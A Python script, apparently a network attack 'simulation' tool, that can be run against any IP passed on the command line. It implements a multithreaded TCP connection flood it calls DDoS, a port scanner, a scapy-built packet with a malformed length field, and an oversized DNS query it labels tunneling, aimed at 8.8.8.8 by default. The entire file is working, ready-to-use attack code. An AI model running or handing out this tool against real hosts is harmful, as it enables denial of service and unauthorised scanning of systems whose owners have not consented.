import argparse
import socket
import threading
import time
from scapy.all import IP, TCP, UDP, DNS, DNSQR, send

# ==== Default Settings ====
DEFAULT_TARGET = "127.0.0.1"
DEFAULT_PORT = 8888
DEFAULT_RANGE = (8000, 8100)
DEFAULT_NUM_THREADS = 50
DEFAULT_NUM_PACKETS = 1000
DEFAULT_INTERVAL = 0.001

# ==== Attack Definitions ====
def ddos_attack(target_ip, target_port, num_threads=DEFAULT_NUM_THREADS, num_packets=DEFAULT_NUM_PACKETS, interval=DEFAULT_INTERVAL):
    def flood():
        for _ in range(num_packets):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target_ip, target_port))
                s.send(b"A" * 1024)
                s.close()
                time.sleep(interval)
            except:
                pass

    print(f"[+] DDoS: {num_threads} threads x {num_packets} packets to {target_ip}:{target_port}")
    threads = [threading.Thread(target=flood) for _ in range(num_threads)]
    for t in threads: t.start()
    for t in threads: t.join()
    print("[✓] DDoS completed.")

def port_scan(target_ip, start_port, end_port):
    print(f"[+] Port Scan: {target_ip}, ports {start_port}-{end_port}")
    for port in range(start_port, end_port + 1):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            s.connect((target_ip, port))
            print(f"[OPEN] Port {port}")
            s.close()
        except:
            pass
    print("[✓] Scan completed.")

def send_malformed_packet(target_ip):
    print(f"[+] Sending malformed packet to {target_ip}")
    pkt = IP(dst=target_ip, len=10)/TCP(flags="S")
    send(pkt, verbose=0)
    print("[✓] Malformed packet sent.")

def fake_dns_tunnel(target_ip="8.8.8.8"):
    print(f"[+] DNS tunnel query to {target_ip}")
    long_domain = "x" * 120 + ".tk"
    pkt = IP(dst=target_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=long_domain))
    send(pkt, verbose=0)
    print("[✓] DNS packet sent.")

# ==== CLI ====
def main():
    parser = argparse.ArgumentParser(description="🧪 Network Attack Simulation Tool")
    parser.add_argument("mode", type=int, choices=[1, 2, 3, 4], help="""
        1 = DDoS Flood (default 127.0.0.1:8888)
        2 = Port Scanning (default 127.0.0.1, 8000-8100)
        3 = Malformed Packet (default 127.0.0.1)
        4 = DNS Tunneling (default 8.8.8.8)
    """)
    parser.add_argument("--target", type=str, help="Target IP address")
    parser.add_argument("--port", type=int, help="Target port (for DDoS)")
    parser.add_argument("--range", type=str, help="Port range, e.g., 8000-8100")

    args = parser.parse_args()

    # Determine effective values
    target = args.target or DEFAULT_TARGET
    port = args.port or DEFAULT_PORT
    if args.range:
        start_port, end_port = map(int, args.range.split("-"))
    else:
        start_port, end_port = DEFAULT_RANGE

    if args.mode == 1:
        ddos_attack(target, port)
    elif args.mode == 2:
        port_scan(target, start_port, end_port)
    elif args.mode == 3:
        send_malformed_packet(target)
    elif args.mode == 4:
        fake_dns_tunnel(target if args.target else "8.8.8.8")

if __name__ == "__main__":
    main()
